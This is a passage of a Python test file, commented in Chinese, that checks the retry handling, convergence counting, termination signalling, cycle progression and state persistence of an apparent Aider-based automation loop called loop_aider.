            state["progress"]["retry_count_this_phase"] = 4
            sm.save_state(state)
            loaded = sm.load_state()
            assert loaded["progress"]["retry_count_this_phase"] == 4

    def test_repair_context_retry_on_failure(self):
        """验证: 修复失败后可以重试。"""
        mgr = RepairManager({"repair_max_attempts": 3})
        state = {"progress": {}}
        p2_issues = _make_p2_issues()
        p2_titles = [i.title for i in p2_issues]

        ctx = mgr.create_context(state, p2_titles)
        # 模拟一次失败
        ctx.attempt_count = 1

        # 未达上限，可以重试
        assert ctx.attempt_count < ctx.max_attempts
        assert not ctx.is_consumed

    def test_health_check_degraded_status(self):
        """验证: HealthStatus COMPATIBLE_WITH_WARNINGS 仍可继续。"""
        from loop_aider.aider_manager import HealthStatus
        status = HealthStatus.COMPATIBLE_WITH_WARNINGS
        assert status != HealthStatus.INCOMPATIBLE
        assert status != HealthStatus.NOT_FOUND
        # 有警告但仍可运行
        assert status in (
            HealthStatus.OK,
            HealthStatus.COMPATIBLE_WITH_WARNINGS,
        )


# =========================================================================
# 场景 11: 完整收敛与终止路径
# =========================================================================

class TestConvergenceAndTermination:
    """Golden Test 11: 模拟完整收敛路径。

    验证:
        1. 收敛计数器从 0 递增到 thresholds
        2. Part 1 语义收敛 → 进入 Part 2
        3. 达到 convergence_rounds 后触发终止
        4. Cycle 正常递增和重置
        5. 完整的状态转换历史
    """

    def test_full_convergence_path_counter_progression(self):
        """验证: 收敛计数器从 0 递增到阈值的完整路径。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_2_8",
                "cycle": 2,
                "convergence_counter": 0,
                "phase_transitions": [],
            },
            "config": {"max_cycles": 5, "convergence_rounds": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {},
        }

        # 第一轮：解决问题，无新问题
        c = engine.update_counter(state, new_issues=False, issues_resolved=True, exit_code=0)
        assert c == 1

        # 第二轮：继续
        c = engine.update_counter(state, new_issues=False, issues_resolved=True, exit_code=0)
        assert c == 2

        # 第三轮：继续
        c = engine.update_counter(state, new_issues=False, issues_resolved=True, exit_code=0)
        assert c == 3

    def test_full_convergence_termination_signal(self):
        """验证: 达到收敛阈值时 should_terminate 返回 True。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_2_8",
                "cycle": 2,
                "convergence_counter": 3,
                "phase_transitions": [
                    {"from": "init", "to": "part_1_1"},
                    {"from": "part_1_1", "to": "part_1_2"},
                    {"from": "part_1_2", "to": "part_1_3"},
                    {"from": "part_1_3", "to": "part_2_1"},
                ],
            },
            "config": {"max_cycles": 5, "convergence_rounds": 2},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {
                "requirements.md": "...",
                "direction.md": "...",
                "solution.md": "...",
            },
        }

        result = engine.should_terminate(state)
        assert result.converged is True
        assert result.semver_converged is True

    def test_full_cycle_progression(self):
        """验证: 完整的 cycle 递增和 phase 重置路径。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # Cycle 1: init → Part 1 全程
            sm.update_phase(state, "part_1_1")
            sm.update_phase(state, "part_1_2")
            sm.update_phase(state, "part_1_3")
            assert state["progress"]["cycle"] == 1

            # 进入 Part 2
            sm.update_phase(state, "part_2_1")
            assert state["progress"]["phase"] == "part_2_1"

            # 模拟完成一个周期
            state["progress"]["cycle"] = 2
            sm.save_state(state)

            loaded = sm.load_state()
            assert loaded["progress"]["cycle"] == 2

    def test_cycle_completion_resets_part1_round(self):
        """验证: Cycle 完成时重置 part1_round。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # 模拟中间状态
            state["progress"]["phase"] = "part_2_8"
            state["progress"]["cycle"] = 1
            state["progress"]["part1_round"] = 2  # 上一轮回退过

            # 完成周期 → 重置
            state["progress"]["cycle"] = 2
            state["progress"]["part1_round"] = 0

            assert state["progress"]["part1_round"] == 0
            assert state["progress"]["cycle"] == 2

    def test_termination_state_persistence(self):
        """验证: 终止状态被持久化到 state.json。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            state["termination"]["status"] = "completed"
            state["termination"]["exit_reason"] = "convergence achieved"
            state["termination"]["completed_at"] = "2025-01-01T00:00:00+00:00"
            sm.save_state(state)

            loaded = sm.load_state()
            assert loaded["termination"]["status"] == "completed"
            assert loaded["termination"]["exit_reason"] == "convergence achieved"

    def test_convergence_counter_is_persisted(self):
        """验证: convergence_counter 在 state.json 中持久化。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            state["progress"]["convergence_counter"] = 2
            sm.save_state(state)

            loaded = sm.load_state()
            assert loaded["progress"]["convergence_counter"] == 2

    def test_full_scheduler_termination_integration(self):
        """验证: Scheduler 在终止状态下正确反映。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            state_dir = Path(tmpdir) / ".aider" / "loop-aider"
            from loop_aider.scheduler import Scheduler

            scheduler = Scheduler(
                run_dir=tmpdir,
                state_dir=str(state_dir),
                goal="test termination",
                mode="auto",
                max_cycles=1,
            )

            # 标记终止
            scheduler._terminated = True
            assert scheduler.should_terminate() is True

            status = scheduler.get_status()
            assert "phase" in status
            assert "cycle" in status
            assert "termination_status" in status
